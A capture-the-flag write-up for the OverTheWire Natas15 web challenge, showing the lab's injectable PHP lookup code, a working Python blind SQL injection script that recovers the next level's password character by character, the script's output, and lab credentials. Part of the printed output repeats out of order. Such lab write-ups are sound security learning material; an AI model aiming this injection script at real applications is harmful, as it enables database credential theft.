# CTF Writeup - **OverTheWire Natas14 - Natas15**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas14 - Natas15
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 13-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using blind injection.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
URL:      http://natas15.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for username as input.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
Username: natas16
Check Existence
This user exists.
```

Now we see that we get user exists. Lets view the source code. 

```bash
# <?php

# /*
# CREATE TABLE `users` (
#   `username` varchar(64) DEFAULT NULL,
#   `password` varchar(64) DEFAULT NULL
# );
# */

# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysqli_connect('localhost', 'natas15', '<censored>');
#     mysqli_select_db($link, 'natas15');

#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     $res = mysqli_query($link, $query);
#     if($res) {
#     if(mysqli_num_rows($res) > 0) {
#         echo "This user exists.<br>";
#     } else {
#         echo "This user doesn't exist.<br>";
#     }
#     } else {
#         echo "Error in query.<br>";
#     }

#     mysqli_close($link);
# } else {
# ?>
```

We can see that there is a small piece of code that is executed when we click on submit. That takes out input username and appends it to an sql string and checks if the return value has greater than 1 then its shows the password. The best resource for this challenge is `https://www.youtube.com/watch?v=fQ_Iehcm9OQ`. I would highly recommend watching this tutorial. Now lets write some code based on the idea given in tutorials as shown below.


```bash
import string
import requests

# Credentials and target URL
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = "http://natas15.natas.labs.overthewire.org"

# Possible characters (letters + digits)
chars = string.ascii_letters + string.digits
validstr = "This user exists."

# Step 1: Determine the valid characters in the password
valid_password = ""
for char in chars:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(username, password))
    if validstr in r.text:
        valid_password += char
        print("Password Dictionary: {}".format(''.join(valid_password)))

# Step 2: Brute-force the password character by character
actual_password = ""
while len(actual_password) < 32: 
    for char in valid_password:
        temp_password = actual_password + char
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',temp_password,'%','&debug'])
        response = requests.get(uri, auth=(username, password))
        if validstr in response.text:
            actual_password += char
            print(f"Password so far: {actual_password}")
            break

print(f"Password found: {actual_password}")
```

What we are doing here is that we are essentially finding all the characters in the password using the bruteforce approach and blind sql injection which checks if there exists a username with `natas16` and password has `character` with this we will have all the characters in the password. Now we need to determine the order of these characters that is done in the second loop where we build the characters one by one untill we find the right order.  

```bash
# Password Dictionary: c
# Password Dictionary: ce
# Password Dictionary: cef
# Password Dictionary: cefh
# Password Dictionary: cefhi
# Password Dictionary: cefhij
# Password Dictionary: cefhijk
# Password Dictionary: cefhijkm
# Password Dictionary: cefhijkmo
# Password Dictionary: cefhijkmos
# Password Dictionary: cefhijkmost
# Password Dictionary: cefhijkmostu
# Password Dictionary: cefhijkmostuv
# Password Dictionary: cefhijkmostuvD
# Password Dictionary: cefhijkmostuvDE
# Password Dictionary: cefhijkmostuvDEG
# Password Dictionary: cefhijkmostuvDEGK
# Password Dictionary: cefhijkmostuvDEGKL
# Password Dictionary: cefhijkmostuvDEGKLM
# Password Dictionary: cefhijkmostuvDEGKLMP
# Password Dictionary: cefhijkmostuvDEGKLMPQ
# Password Dictionary: cefhijkmostuvDEGKLMPQV
# Password Dictionary: cefhijkmostuvDEGKLMPQVW
# Password Dictionary: cefhijkmostuvDEGKLMPQVWX
# Password Dictionary: cefhijkmostuvDEGKLMPQVWXY
# Password Dictionary: cefhijkmostuvDEGKLMPQVWXY3
# Password Dictionary: cefhijkmostuvDEGKLMPQVWXY34
# Password Dictionary: cefhijkmostuvDEGKLMPQVWXY346
# Password so far: h
# Password so far: hP
# Password so far: hPk
# Password so far: hPkj
# Password so far: hPkjK
# Password so far: hPkjKY
# Password so far: hPkjKYv
# Password so far: hPkjKYvi
# Password so far: hPkjKYviL
# Password so far: hPkjKYviLQ
# Password so far: hPkjKYviLQc
# Password so far: hPkjKYviLQct
# Password so far: hPkjKYviLQctE
# Password so far: hPkjKYviLQctEW
# Password so far: hPkjKYviLQctEW3
# Password so far: hPkjKYviLQctEW33
# Password so far: hPkjKYviLQctEW33Q
# Password so far: hPkjKYviLQctEW33Qm
# Password so far: hPkjKYviLQctEW33Qmu
# Password so far: hPkjKYviLQctEW33QmuX
# Password so far: hPkjKYviLQctEW33QmuXL
# Password so far: hPkjKYviLQctEW33QmuXL6
# Password so far: hPkjKYviLQctEW33QmuXL6e
# Password so far: hPkjKYviLQctEW33QmuXL6eD
# Password so far: hPkjKYviLQctEW33QmuXL6eDV
# Password so far: hPkjKYviLQctEW33QmuXL6eDVf
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
# Password so far: hPkjKYviLQctEW33QmuXL6
# Password so far: hPkjKYviLQctEW33QmuXL6e
# Password so far: hPkjKYviLQctEW33QmuXL6eD
# Password so far: hPkjKYviLQctEW33QmuXL6eDV
# Password so far: hPkjKYviLQctEW33QmuXL6eDVf
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
# Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
# Password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```


## Flag

**Flag:** hPkjKYviLQctEW33QmuXL6eDVfMW4sGo


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.